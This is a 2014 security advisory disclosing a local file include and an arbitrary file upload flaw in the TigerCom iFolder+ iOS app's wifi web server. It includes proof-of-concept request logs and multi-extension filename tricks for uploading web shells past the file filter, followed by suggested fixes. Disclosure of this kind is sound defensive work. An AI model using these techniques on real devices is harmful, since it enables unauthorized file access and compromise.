Document Title:
===============
TigerCom iFolder+ v1.2 iOS - Multiple Vulnerabilities


References (Source):
====================
http://www.vulnerability-lab.com/get_content.php?id=1284


Release Date:
=============
2014-07-30


Vulnerability Laboratory ID (VL-ID):
====================================
1284


Common Vulnerability Scoring System:
====================================
7.4


Product & Service Introduction:
===============================
iFolder+, Belong to yourself is a mobile application coded by TigerCom. The application allows to communicate
and share information or files in the wifi network. The app is uncommercial and can be downloaded through the
apple itunes shop or app-store.

- Safty
- Intelligent encryption, protect the folder
- No Internet connection to prevent the documents stolen
- Password protected, locked the document
- Wireless transmission
- Using Wifi, you can share files between iphone, ipad and computer
- Current open folder sharing, better protect your privacy
- Private photos/videos/documents
- Import photos and videos from album
- Export photos and videos to your album
- Open camera, store photos and recording video
- Photos and videos preview
- Photos and video high fidelity storage
- Photo browsing, support for gestures to zoom
- video playing, perfect playback experience
- Support PDF, TXT documents directly browsing
- Photo folder, Video folder, Documents folder, easily classified
- Support Wifi Import and Export
- Private accounts/contacts
- Account protection, add a variety of accounts

( Copy of the Homepage: https://itunes.apple.com/de/app/ifolder+/id622423906 )


Abstract Advisory Information:
==============================
The Vulnerability Laboratory Research Team discovered multiple vulnerabilities in the official TigerCom iFolder+ v1.2 iOS mobile application.


Vulnerability Disclosure Timeline:
==================================
2014-07-30: Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Affected Product(s):
====================
TigerCom
Product: iFolder+ - iOS Mobile Web Application 1.2


Exploitation Technique:
=======================
Remote


Severity Level:
===============
High


Technical Details & Description:
================================
1.1
A local file include web vulnerability has been discovered in the official TigerCom iFolder+ v1.2 iOS mobile web-application.
The local file include web vulnerability allows remote attackers to unauthorized include local file/path requests or system specific
path commands to compromise the mobile web-application.

The web vulnerability is located in the `filename` value of the `uploadfile` module. Remote attackers are able to inject own files
with malicious `filename` values in the `uploadfile` POST method request to compromise the mobile web-application. The local file/path
include execution occcurs in the index `folder list` context next to the vulnerable filename value. The attacker is able to inject the
local file request by usage of the available `wifi interface` for file or folder exchange/share.

Remote attackers are also able to exploit the filename validation issue in combination with persistent injected script codes to execute
different local malicious attacks requests. The attack vector is on the application-side of the wifi service and the request method to
inject is POST.

The security risk of the local file include web vulnerability is estimated as high with a cvss (common vulnerability scoring system) count
of 7.3. Exploitation of the local file include web vulnerability requires no privileged web-application user account or user interaction.
Successful exploitation of the local file include web vulnerability results in mobile application or connected device component compromise.


Request Method(s):
				[+] [POST]

Vulnerable Service(s):
				[+] iFolder+ v1.2

Vulnerable Module(s):
				[+] uploadfile

Vulnerable Parameter(s):
				[+] filename

Affected Module(s):
				[+] Index Folder Dir Listing (http://localhost:8080/)


1.2
An arbitrary file upload web vulnerability has been discovered in the official TigerCom iFolder+ v1.2 iOS mobile web-application.
The arbitrary file upload issue allows remote attackers to upload files with multiple extensions to bypass the web-server or system validation.

The vulnerability is located in the `uploadfile` module. Remote attackers are able to upload a php or js web-shells by renaming the file with
multiple extensions to bypass the file restriction mechanism. The attacker uploads for example a web-shell with the following name and extension
`image.jpg.gif.js.php.jpg`. After the upload the attacker needs to open the file in the web application. He deletes the .jpg & . gif file
extension and can access the application file with elevated access rights.

The security risk of the arbitrary file upload web vulnerability is estimated as high with a cvss (common vulnerability scoring system) count of 7.4.
Exploitation of the arbitrary file upload web vulnerability requires no user interaction or privilege application user account with password.
Successful exploitation of the vulnerability results in unauthorized file access because of a compromise after the upload of web-shells.


Request Method(s):
				[+] [POST]

Vulnerable Module(s):
				[+] uploadfile

Vulnerable Parameter(s):
				[+] filename (multiple extensions)

Affected Module(s):
				[+] Index Folder Dir Listing (http://localhost:8080/)


Proof of Concept (PoC):
=======================
1.1
The local file include web vulnerability can be exploited by local attackers without privileged application user account or user interaction.
For security demonstration or to reproduce the security vulnerability follow the provided information and steps below to continue.

PoC: Index File Dir Listing (http://localhost:8080)
<a href="/<./[LOCAL FILE INCLUDE VULNERABILITY!].png" target="_blank"> <./[LOCAL FILE INCLUDE VULNERABILITY!].png
</a></td></tr></table></div></body>
</html></iframe></a>


--- PoC Session Logs [POST] ---
Status: 200[OK]
POST http://localhost:8080/uploadfile Load Flags[LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] Gr��e des Inhalts[-1] Mime Type[application/x-unknown-content-type]
   Request Header:
      Host[localhost:8080]
      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0]
      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
      Accept-Language[de,en-US;q=0.7,en;q=0.3]
      Accept-Encoding[gzip, deflate]
      Referer[http://localhost:8080/]
      Connection[keep-alive]
   POST-Daten:
      POST_DATA[-----------------------------165081174024576
Content-Disposition: form-data; name="upload1"; filename="./[LOCAL FILE INCLUDE VULNERABILITY!].*"
Content-Type: image/png

Status: 200[OK]
GET http://localhost:8080/./[LOCAL FILE INCLUDE VULNERABILITY!].* Load Flags[LOAD_DOCUMENT_URI  ] Gr��e des Inhalts[0] Mime Type[application/x-unknown-content-type]
   Request Header:
      Host[localhost:8080]
      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0]
      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
      Accept-Language[de,en-US;q=0.7,en;q=0.3]
      Accept-Encoding[gzip, deflate]
      Referer[http://localhost:8080/uploadfile]
      Connection[keep-alive]
   Response Header:
      Accept-Ranges[bytes]
      Content-Length[0]
      Date[Tue, 29 Jul 2014 14:32:09 GMT]


Reference(s):
http://localhost:8080/
http://localhost:8080/uploadfile


1.2
The arbitrary file upload web vulnerability can be exploited by local attackers without privileged application user account or user interaction.
For security demonstration or to reproduce the security vulnerability follow the provided information and steps below to continue.

Standard Link to View and Download:
http://localhost:8080/[x].png

PoC: 200[OK] GET
http://localhost:8080/[ARBITRARY FILE UPLOAD VULNERABILITY!].png.jpg.php.js.html
http://localhost:8080/[ARBITRARY FILE UPLOAD VULNERABILITY!].png.jpg.php


--- PoC Session Logs [POST] ---
Status: 200[OK]
 POST http://localhost:8080/uploadfile Load Flags[LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] Gr��e des Inhalts[-1] Mime Type[application/x-unknown-content-type]
   Request Header:
      Host[localhost:8080]
      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0]
      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
      Accept-Language[de,en-US;q=0.7,en;q=0.3]
      Accept-Encoding[gzip, deflate]
      Referer[http://localhost:8080/]
      Connection[keep-alive]
   POST-Daten:
   POST_DATA[-----------------------------253371365330237
Content-Disposition: form-data; name="upload1"; filename="[ARBITRARY FILE UPLOAD VULNERABILITY!].png.jpg.php.js.html.jpg.png"
Content-Type: image/png

Status: 200[OK]
GET http://localhost:8080/[ARBITRARY FILE UPLOAD VULNERABILITY!].png.jpg.php.js.html.jpg.png Load Flags[LOAD_DOCUMENT_URI  ] Gr��e des Inhalts[0] Mime Type[application/x-unknown-content-type]
   Request Header:
      Host[localhost:8080]
      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0]
      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
      Accept-Language[de,en-US;q=0.7,en;q=0.3]
      Accept-Encoding[gzip, deflate]
      Referer[http://localhost:8080/uploadfile]
      Connection[keep-alive]
   Response Header:
      Accept-Ranges[bytes]
      Content-Length[0]


Reference(s):
http://localhost:8080/
http://localhost:8080/uploadfile


Solution - Fix & Patch:
=======================
1.1
The file inlcude vulnerability can be patched by a secure parse and encode of the filename value in the upload file POSt method request.

1.2
The arbitrary file upload issue can be fixed by a secure restriction and filter procedure in the filename type validation mechanism.
Restrict the input and check for extentions to prevent arbitrary file upload with further exploitation.


Security Risk:
==============
1.1
The security risk of the local file include web vulnerability is estimated as high.

1.2
The security risk of the arbitrary file upload web vulnerability is estimated as critical.


Credits & Authors:
==================
Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@evolution-sec.com) [www.vulnerability-lab.com]


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either
expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers
are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even
if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation
of liability for consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break
any vendor licenses, policies, deface websites, hack into databases or trade with fraud/stolen material.

Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       		- www.evolution-sec.com
Contact:    admin@vulnerability-lab.com 	- research@vulnerability-lab.com 	       		- admin@evolution-sec.com
Section:    dev.vulnerability-db.com	 	- forum.vulnerability-db.com 		       		- magazine.vulnerability-db.com
Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       		- youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   		- vulnerability-lab.com/rss/rss_news.php
Programs:   vulnerability-lab.com/submit.php  	- vulnerability-lab.com/list-of-bug-bounty-programs.php	- vulnerability-lab.com/register/

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to
electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by
Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website
is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact
(admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.

				Copyright � 2014 | Vulnerability Laboratory [Evolution Security]





--
VULNERABILITY LABORATORY RESEARCH TEAM
DOMAIN: www.vulnerability-lab.com
CONTACT: research@vulnerability-lab.com